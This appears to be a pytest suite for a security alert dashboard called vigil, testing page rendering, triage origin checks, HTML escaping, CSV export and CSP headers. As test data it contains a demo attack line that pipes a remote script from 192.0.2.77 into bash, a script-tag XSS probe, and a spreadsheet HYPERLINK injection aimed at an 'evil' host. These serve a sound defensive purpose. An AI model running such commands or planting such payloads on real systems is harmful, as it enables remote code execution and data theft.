from datetime import datetime

import pytest

from vigil.demo import generate
from vigil.sources import DemoSource
from vigil.web import create_app

ORIGIN = {"Origin": "http://localhost"}


@pytest.fixture()
def src():
    return DemoSource(generate(datetime.now().astimezone()))


@pytest.fixture()
def client(src):
    app = create_app(src, ":memory:")
    app.config["TESTING"] = True
    return app.test_client()


def attacker_login(src):
    return next(a for a in src.alerts if a.rule_id == "40112")


@pytest.mark.parametrize("url", ["/", "/?range=7d", "/?range=bogus", "/alerts", "/alerts?view=all&status=",
                                 "/alerts?severity=high&status=", "/alerts?mitre=Initial+Access",
                                 "/agents", "/rules", "/ip/192.0.2.77", "/ip/198.51.100.1"])
def test_pages_render(client, url):
    assert client.get(url).status_code == 200


def test_unknown_alert_is_404(client):
    assert client.get("/alert/does-not-exist").status_code == 404


def test_attack_chain_shows_post_login_activity(client):
    html = client.get("/ip/192.0.2.77").get_data(as_text=True)
    assert "After the login" in html
    assert "New user added to the system." in html   # useradd has no source IP
    assert "curl http://192.0.2.77/x.sh | bash" in html


def test_triage_requires_same_origin(client, src):
    a = attacker_login(src)
    assert client.post(f"/alert/{a.id}/triage", data={"status": "closed"}).status_code == 403
    resp = client.post(f"/alert/{a.id}/triage", data={"status": "closed", "note": "lab test"},
                       headers=ORIGIN)
    assert resp.status_code == 302
    page = client.get(f"/alert/{a.id}").get_data(as_text=True)
    assert "lab test" in page


def test_bulk_triage_by_group(client, src):
    fails = [a for a in src.alerts if a.rule_id == "5760" and a.src_ip == "192.0.2.77"]
    key = "|".join(fails[0].group_key)
    resp = client.post("/triage", data={"status": "acknowledged", "group": key, "range": "24h"},
                       headers=ORIGIN)
    assert resp.status_code == 302
    html = client.get(f"/alerts?view=all&status=acknowledged&src_ip=192.0.2.77").get_data(as_text=True)
    assert html.count('class="status st-acknowledged"') == len(fails)


def test_log_text_is_escaped(client, src):
    # Log lines are attacker-controlled; they must never render as HTML.
    a = src.alerts[0]
    a.full_log = '<script>alert(1)</script>'
    html = client.get(f"/alert/{a.id}").get_data(as_text=True)
    assert "<script>alert(1)</script>" not in html
    assert "&lt;script&gt;" in html


def test_csv_neutralizes_formulas(client, src):
    src.alerts[0].full_log = "=HYPERLINK(\"http://evil\")"
    body = client.get("/alerts.csv").get_data(as_text=True)
    assert "'=HYPERLINK" in body


def test_security_headers(client):
    resp = client.get("/")
    assert "script-src 'self'" in resp.headers["Content-Security-Policy"]
    assert resp.headers["X-Content-Type-Options"] == "nosniff"


def test_templates_have_no_inline_scripts_or_styles(client):
    # The CSP forbids them, so they'd silently break in the browser.
    html = client.get("/").get_data(as_text=True) + client.get("/ip/192.0.2.77").get_data(as_text=True)
    assert "<script>" not in html and 'style="' not in html


def test_unreachable_source_shows_help():
    import requests

    class Down(DemoSource):
        def fetch(self, *a, **k):
            raise requests.exceptions.ConnectionError("refused")

        def health(self):
            return False, "can't reach the indexer"

    app = create_app(Down([]), ":memory:")
    resp = app.test_client().get("/")
    assert resp.status_code == 502 and b"reach the indexer" in resp.data
